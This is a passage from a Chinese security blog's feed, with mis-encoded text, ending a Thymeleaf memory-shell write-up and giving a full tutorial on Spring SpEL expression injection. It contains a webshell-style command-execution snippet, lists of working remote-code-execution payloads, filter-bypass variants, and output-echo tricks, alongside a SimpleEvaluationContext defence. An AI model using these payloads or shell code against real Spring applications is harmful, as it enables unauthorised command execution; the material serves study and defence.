<span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br>                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.htm">https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.htm</a></p><p><a href="https://cn-sec.com/archives/3118198.html">https://cn-sec.com/archives/3118198.html</a></p><p><a href="https://forum.butian.net/share/1922">https://forum.butian.net/share/1922</a></p><p><a href="https://xz.aliyun.com/t/11688?time__1311=Cq0xRQKQq7qmqGNDQiiQqPGI3oLfObQWa4D">https://xz.aliyun.com/t/11688?time__1311=Cq0xRQKQq7qmqGNDQiiQqPGI3oLfObQWa4D</a></p><p><a href="http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPELè¡¨è¾¾å¼æ³¨å…¥</title>
      <link href="/2024/12/14/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/12/14/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>èµ¶ç´§æ¥è¡¥ä¸€ä¸‹SPELè¡¨è¾¾å¼æ³¨å…¥ï¼Œå‰é¢Thymeleafæœ¬è´¨ç”¨çš„å°±æ˜¯SPELè¡¨è¾¾å¼</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Springè¡¨è¾¾å¼è¯­è¨€ï¼ˆç®€ç§° <strong>SpEL</strong>ï¼Œå…¨ç§°<strong>Spring Expression Language</strong>ï¼‰æ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ã€‚å®ƒè¯­æ³•ç±»ä¼¼äºOGNLï¼ŒMVELå’ŒJBoss ELï¼Œåœ¨æ–¹æ³•è°ƒç”¨å’ŒåŸºæœ¬çš„å­—ç¬¦ä¸²æ¨¡æ¿æä¾›äº†æå¤§åœ°ä¾¿åˆ©ï¼Œä¹Ÿå¼€å‘å‡è½»äº†Javaä»£ç é‡ã€‚å¦å¤– , SpELæ˜¯Springäº§å“ç»„åˆä¸­è¡¨è¾¾è¯„ä¼°çš„åŸºç¡€ï¼Œä½†å®ƒå¹¶ä¸ç›´æ¥ä¸Springç»‘å®š,å¯ä»¥ç‹¬ç«‹ä½¿ç”¨ã€‚</p><h1 id="demoç¤ºä¾‹"><a href="#Demoç¤ºä¾‹" class="headerlink" title="Demoç¤ºä¾‹"></a>Demoç¤ºä¾‹</h1><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.spel;<br><br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.ExpressionParser;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpElController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/spelTest&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">catUser</span><span class="hljs-params">(String message)</span> &#123;<br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(message);<br>        <span class="hljs-keyword">return</span> expression.getValue().toString(); <span class="hljs-comment">//è·å–è¡¨è¾¾å¼æ‰§è¡Œçš„ç»“æœ</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚æˆ‘ä»¬ä¼ ä¸€ä¸ªç”Ÿæˆéšæœºæ•°çš„è¡¨è¾¾å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/spelTest?message=T(java.lang.Math).random()*100<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241214130112061.png" alt="image-20241214130112061"></p><p>ä¸‹é¢çš„å½¢å¼å¯ä»¥ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/spelTest?message=new%20java.lang.ProcessBuilder(%22whoami%22).start() <br></code></pre></td></tr></table></figure><h1 id="spelè¯­æ³•"><a href="#SpElè¯­æ³•" class="headerlink" title="SpElè¯­æ³•"></a>SpElè¯­æ³•</h1><p>spelç”¨<code>#&#123;...&#125;</code>ä½œä¸ºç•Œå®šç¬¦ï¼Œæ‰€æœ‰åœ¨å¤§æ‹¬å·ä¸­çš„å­—ç¬¦éƒ½å°†è¢«è®¤ä¸ºæ˜¯ SpELè¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­ä½¿ç”¨è¿ç®—ç¬¦ï¼Œå˜é‡ä»¥åŠå¼•ç”¨beanï¼Œå±æ€§å’Œæ–¹æ³•</p><ul><li>å¼•ç”¨å…¶ä»–å¯¹è±¡:<code>#&#123;car&#125;</code></li><li>å¼•ç”¨å…¶ä»–å¯¹è±¡çš„å±æ€§ï¼š<code>#&#123;car.brand&#125;</code></li><li>è°ƒç”¨å…¶å®ƒæ–¹æ³• , è¿˜å¯ä»¥é“¾å¼æ“ä½œï¼š<code>#&#123;car.toString()&#125;</code></li></ul><p>å…¶ä¸­å±æ€§åç§°å¼•ç”¨è¿˜å¯ä»¥ç”¨<code>$</code>ç¬¦å· å¦‚ï¼š<code>$&#123;someProperty&#125;</code></p><blockquote><p>è¿™é‡Œéœ€è¦æ³¨æ„#{}å’Œ${}çš„åŒºåˆ«ï¼š</p><ul><li>#{}å°±æ˜¯SpELçš„å®šç•Œç¬¦ï¼Œç”¨äºæŒ‡æ˜å†…å®¹æœªSpELè¡¨è¾¾å¼å¹¶æ‰§è¡Œï¼›</li><li>${}ä¸»è¦ç”¨äºåŠ è½½å¤–éƒ¨å±æ€§æ–‡ä»¶ä¸­çš„å€¼ï¼›</li><li>ä¸¤è€…å¯ä»¥æ··åˆä½¿ç”¨ï¼Œä½†æ˜¯å¿…é¡»#{}åœ¨å¤–é¢ï¼Œ${}åœ¨é‡Œé¢ï¼Œå¦‚#{â€˜${}â€™}ï¼Œæ³¨æ„å•å¼•å·æ˜¯å­—ç¬¦ä¸²ç±»å‹æ‰æ·»åŠ çš„ï¼›</li></ul></blockquote><p>é™¤æ­¤ä»¥å¤–åœ¨SpELä¸­ï¼Œä½¿ç”¨<code>T()</code>è¿ç®—ç¬¦ä¼šè°ƒç”¨ç±»ä½œç”¨åŸŸçš„æ–¹æ³•å’Œå¸¸é‡ï¼Œæƒ³ä½¿ç”¨æŸä¸ªç±»å°±å¯ä»¥åƒå‰é¢çš„demoä¸€æ ·</p><p>æ³¨æ„é™¤äº†java.langåŒ…ä¸‹çš„ç±»ï¼Œå…¶ä»–ç±»éƒ½è¦ç”¨å…¨ç±»åçš„å½¢å¼ã€‚</p><p><strong>å„ç§æ“ä½œç¬¦</strong></p><p>å‰é¢æˆ‘ä»¬å°†è¾“å…¥çš„å‚æ•°ç›´æ¥å½“æˆSpELè¡¨è¾¾å¼å»æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æ²¡æœ‰è¾“å…¥<code>#&#123;&#125;</code>ï¼Œä½†æ˜¯å¦‚æœç”¨@Valueå»è·å–å€¼æ‰§è¡Œå°±éœ€è¦äº†ï¼Œä¸‹é¢æ˜¯ä¸€äº›è¡¨è¾¾å¼ç¤ºä¾‹ï¼š</p><p><strong>ç®—æœ¯è¿ç®—</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//é™¤æ³•å’Œæ¨¡è¿ç®—å…·æœ‰å­—æ¯åˆ«åï¼Œdivä»£è¡¨/ï¼Œmodä»£è¡¨ï¼…ã€‚ +è¿ç®—ç¬¦è¿˜å¯ç”¨äºè¿æ¥å­—ç¬¦ä¸²ã€‚</span><br><span class="hljs-meta">@Value(&quot;#&#123;&#x27;string1&#x27;+&#x27;string2&#x27;&#125;&quot;)</span> <span class="hljs-comment">//å­—ç¬¦ä¸²æ‹¼æ¥</span><br><span class="hljs-keyword">private</span> String name;<br><br><span class="hljs-meta">@Value(&quot;#&#123;(2 + 2) * 2 + 9&#125;&quot;)</span> <span class="hljs-comment">// 17  è¡¨è¾¾å¼è®¡ç®—</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">double</span> brackets;<br></code></pre></td></tr></table></figure><p><strong>å…³ç³»å’Œé€»è¾‘æ“ä½œ</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;1 == 1&#125;&quot;)</span> <span class="hljs-comment">// true</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> equal;<br><br><span class="hljs-meta">@Value(&quot;#&#123;1 eq 1&#125;&quot;)</span> <span class="hljs-comment">// true</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> equalAlphabetic;<br></code></pre></td></tr></table></figure><p><strong>æ¡ä»¶è¿ç®—</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;2 &gt; 1 ? &#x27;a&#x27; : &#x27;b&#x27;&#125;&quot;)</span> <span class="hljs-comment">// &quot;a&quot;</span><br><span class="hljs-keyword">private</span> String ternary;<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼</strong></p><p><code>matchs</code>è¿ç®—ç¬¦å¯ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä¸ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;&#x27;100fghdjf&#x27; matches &#x27;\\d+&#x27; &#125;&quot;)</span> <span class="hljs-comment">// false</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> invalidNumericStringResult;<br><br><span class="hljs-meta">@Value(&quot;#&#123;&#x27;valid alphabetic string&#x27; matches &#x27;[a-zA-Z\\s]+&#x27; &#125;&quot;)</span> <span class="hljs-comment">// true</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> validAlphabeticStringResult;<br></code></pre></td></tr></table></figure><p><strong>è®¿é—®Listå’ŒMapå¯¹è±¡</strong></p><p>æˆ‘ä»¬å¯ä»¥è®¿é—®ä¸Šä¸‹æ–‡ä¸­ä»»ä½•Mapæˆ–Listçš„å€¼</p><p>æ¯”å¦‚è¿™é‡Œåˆ›å»ºä¸€ä¸ªbean</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component(&quot;workersHolder&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WorkersHolder</span> &#123;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; workers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> Map&lt;String, Integer&gt; salaryByWorkers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">WorkersHolder</span><span class="hljs-params">()</span> &#123;<br>        workers.add(<span class="hljs-string">&quot;John&quot;</span>);<br>        workers.add(<span class="hljs-string">&quot;Susie&quot;</span>);<br>        workers.add(<span class="hljs-string">&quot;Alex&quot;</span>);<br>        workers.add(<span class="hljs-string">&quot;George&quot;</span>);<br><br>        salaryByWorkers.put(<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-number">35000</span>);<br>        salaryByWorkers.put(<span class="hljs-string">&quot;Susie&quot;</span>, <span class="hljs-number">47000</span>);<br>        salaryByWorkers.put(<span class="hljs-string">&quot;Alex&quot;</span>, <span class="hljs-number">12000</span>);<br>        salaryByWorkers.put(<span class="hljs-string">&quot;George&quot;</span>, <span class="hljs-number">14000</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//Getters and setters</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®å…¶ä¸­çš„å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.salaryByWorkers[&#x27;John&#x27;]&#125;&quot;)</span> <span class="hljs-comment">// 35000</span><br><span class="hljs-keyword">private</span> Integer johnSalary;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.salaryByWorkers[&#x27;George&#x27;]&#125;&quot;)</span> <span class="hljs-comment">// 14000</span><br><span class="hljs-keyword">private</span> Integer georgeSalary;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.salaryByWorkers[&#x27;Susie&#x27;]&#125;&quot;)</span> <span class="hljs-comment">// 47000</span><br><span class="hljs-keyword">private</span> Integer susieSalary;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.workers[0]&#125;&quot;)</span> <span class="hljs-comment">// John</span><br><span class="hljs-keyword">private</span> String firstWorker;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.workers[3]&#125;&quot;)</span> <span class="hljs-comment">// George</span><br><span class="hljs-keyword">private</span> String lastWorker;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.workers.size()&#125;&quot;)</span> <span class="hljs-comment">// 4</span><br><span class="hljs-keyword">private</span> Integer numberOfWorkers;<br></code></pre></td></tr></table></figure><p><strong>$ç•Œå®šç¬¦</strong></p><p>å¯ä»¥è®¿é—®application.propertiesæ–‡ä»¶çš„å±æ€§å€¼</p><p><img src="https://cdn.clown2024.cn/image-20241214135525790.png" alt="image-20241214135525790"></p><h1 id="spelè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"><a href="#SpElè¡¨è¾¾å¼æ³¨å…¥æ¼æ´" class="headerlink" title="SpElè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"></a>SpElè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</h1><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>Springæä¾›äº†ä¸¤ä¸ªEvaluationContextï¼š<code>SimpleEvaluationContext</code>å’Œ<code>StandardEvaluationContext</code>ï¼š</p><ul><li>SimpleEvaluationContext - é’ˆå¯¹ä¸éœ€è¦SpELè¯­è¨€è¯­æ³•çš„å…¨éƒ¨èŒƒå›´å¹¶ä¸”åº”è¯¥å—åˆ°æœ‰æ„é™åˆ¶çš„è¡¨è¾¾å¼ç±»åˆ«ï¼Œå…¬å¼€SpELè¯­è¨€ç‰¹æ€§å’Œé…ç½®é€‰é¡¹çš„å­é›†ã€‚</li><li>StandardEvaluationContext - å…¬å¼€å…¨å¥—SpELè¯­è¨€åŠŸèƒ½å’Œé…ç½®é€‰é¡¹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥æŒ‡å®šé»˜è®¤çš„æ ¹å¯¹è±¡å¹¶é…ç½®æ¯ä¸ªå¯ç”¨çš„è¯„ä¼°ç›¸å…³ç­–ç•¥ã€‚</li></ul><p>ç„¶åSpringé»˜è®¤é‡‡ç”¨çš„å°±æ˜¯StandardEvaluationContextï¼Œæˆ‘ä»¬è‡ªå·±å»è°ƒè¯•ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“ï¼Œåœ¨å‰é¢demoä»£ç ä¸­æ‰§è¡ŒgetValueæ–¹æ³•è·å–è¡¨è¾¾å¼ç»“æœè¿”å›çš„è¿‡ç¨‹ä¸­ä¼šç»™contextèµ‹å€¼ï¼Œå¦‚ä¸‹å›¾</p><p><img src="https://cdn.clown2024.cn/image-20241214140834474.png" alt="image-20241214140834474"></p><h2 id="å¸¸ç”¨payloadæ•´ç†"><a href="#å¸¸ç”¨payloadæ•´ç†" class="headerlink" title="å¸¸ç”¨payloadæ•´ç†"></a>å¸¸ç”¨payloadæ•´ç†</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-number">12</span>*<span class="hljs-number">12</span>&#125;<br>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;open -na Calculator&quot;</span>)<br>T(Thread).sleep(<span class="hljs-number">10000</span>)<br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().exec(<span class="hljs-string">&#x27;calc.exe&#x27;</span>)<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-string">&#x27;open -na Calculator&#x27;</span>).start()<br></code></pre></td></tr></table></figure><p><strong>å›æ˜¾</strong></p><p>è¿˜å­¦åˆ°ä¸€ä¸ªåˆ©ç”¨org.apache.commons.ioè¿›è¡Œå›æ˜¾çš„æ“ä½œ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream())<br></code></pre></td></tr></table></figure><p>ä½†å‰ææ˜¯å¼•å…¥äº†commons-ioçš„ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.11.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//åå°„ç»•è¿‡</span><br>T(String).class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>).exec(<span class="hljs-string">&quot;open%20-na%20Calculator&quot;</span>)<br><br><span class="hljs-comment">// + ä¸€å®šè¦ç”¨urlç¼–ç ï¼Œä¸ç„¶æµè§ˆå™¨è§£æä¼šæœ‰é—®é¢˜</span><br>T(String).class.forName(<span class="hljs-string">&quot;java.lang.Ru&quot;</span>%2b<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>%2b<span class="hljs-string">&quot;ntime&quot;</span>).invoke(<span class="hljs-literal">null</span>).exec(<span class="hljs-string">&quot;open%20-na%20Calculator&quot;</span>)<br><br>T(String).getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>).getClass().getMethod(<span class="hljs-string">&quot;exec&quot;</span>,T(String)).invoke(T(java.lang.Runtime).getRuntime(),<span class="hljs-string">&quot;open%20-na%20Calculator&quot;</span>)<br><br><span class="hljs-comment">//ä½¿ç”¨ScriptEngineManageræ„é€ </span><br>T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;open -na Calculator&#x27;)&quot;</span>)<br><br>T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;java.lang.Runt&quot;</span>%2b<span class="hljs-string">&quot;ime.getRu&quot;</span>%2b<span class="hljs-string">&quot;ntime().e&quot;</span>%2b<span class="hljs-string">&quot;xec(&#x27;open -na Calculator&#x27;)&quot;</span>)<br><br><br><span class="hljs-comment">//å¼•å·è¢«è¿‡æ»¤ï¼Œåˆ©ç”¨ç”Ÿæˆä»»æ„å­—ç¬¦+concatå‡½æ•°é‡‡å–å­—ç¬¦ä¸²æ‹¼æ¥</span><br>T(java.lang.Character).toString(<span class="hljs-number">97</span>).concat(T(java.lang.Character).toString(<span class="hljs-number">98</span>))<br></code></pre></td></tr></table></figure><p><strong>å›æ˜¾é—®é¢˜</strong></p><p>æ ¹æ®å‰é¢çš„demoæ‰¾äº†å‡ ä¸ªèƒ½å¤Ÿå°†å‘½ä»¤ç»“æœå›æ˜¾å‡ºæ¥çš„payload</p><p>åˆ©ç”¨StreamUtils</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream()))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241214142327992.png" alt="image-20241214142327992"></p><p>è¿˜æœ‰ç”¨BufferedReaderå°è£…</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream())).readLine()<br></code></pre></td></tr></table></figure><p>ä¸è¿‡åªèƒ½è¯»å–ä¸€è¡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241214142701880.png" alt="image-20241214142701880"></p><p>åˆ©ç”¨Scanner</p><p>åŸç†åœ¨äº<code>Scanner#useDelimiter</code>æ–¹æ³•ä½¿ç”¨æŒ‡å®šçš„å­—ç¬¦ä¸²åˆ†å‰²è¾“å‡ºï¼Œå°±ä¼šè®©æ‰€æœ‰çš„å­—ç¬¦éƒ½åœ¨ç¬¬ä¸€è¡Œï¼Œç„¶åæ‰§è¡Œnextæ–¹æ³•å³å¯è·å¾—æ‰€æœ‰è¾“å‡º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/spelTest?message=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;).getInputStream()).useDelimiter(&quot;%5C%5CA&quot;).next()<br></code></pre></td></tr></table></figure><p>é€šè¿‡urlä¼ è¾“éœ€è¦ç»™\urlç¼–ç ä¸€ä¸‹ï¼Œå› ä¸ºå±äºéæ³•å­—ç¬¦</p><p><img src="https://cdn.clown2024.cn/image-20241214143839106.png" alt="image-20241214143839106"></p><blockquote><p><code>useDelimiter</code> æ–¹æ³•ç”¨äºè®¾ç½® <code>Scanner</code> çš„åˆ†éš”ç¬¦ã€‚<code>&quot;\\A&quot;</code> æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œè¡¨ç¤ºè¾“å…¥æµçš„å¼€å¤´ã€‚ä½¿ç”¨è¿™ä¸ªåˆ†éš”ç¬¦å¯ä»¥è®© <code>Scanner</code> è¯»å–æ•´ä¸ªè¾“å…¥æµï¼Œç›´åˆ°ç»“æŸã€‚</p></blockquote><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><p>å› ä¸ºSpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´å¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡è¡¨è¾¾å¼æ‰§è¡Œç²¾å¿ƒæ„é€ çš„ä»»æ„ä»£ç ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚ä¸ºäº†é˜²å¾¡è¯¥ç±»æ¼æ´ï¼ŒSpringå®˜æ–¹æ¨å‡ºäº†<code>SimpleEvaluationContext</code>ä½œä¸ºå®‰å…¨ç±»æ¥é˜²å¾¡è¯¥ç±»æ¼æ´ã€‚</p><p><code>SimpleEvaluationContext</code> æ—¨åœ¨ä»…æ”¯æŒ SpEL è¯­è¨€è¯­æ³•çš„ä¸€ä¸ªå­é›†ã€‚å®ƒä¸åŒ…æ‹¬ Java ç±»å‹å¼•ç”¨ï¼Œæ„é€ å‡½æ•°å’Œ bean å¼•ç”¨ï¼›æ‰€ä»¥æœ€ç›´æ¥çš„ä¿®å¤æ–¹å¼æ˜¯ä½¿ç”¨ <code>SimpleEvaluationContext</code>â€‰æ›¿æ¢ <code>StandardEvaluationContext</code>ã€‚</p><p>ç”¨æ³•ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(message);<br><span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(message).build();<br><span class="hljs-keyword">return</span> expression.getValue(context).toString();<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a 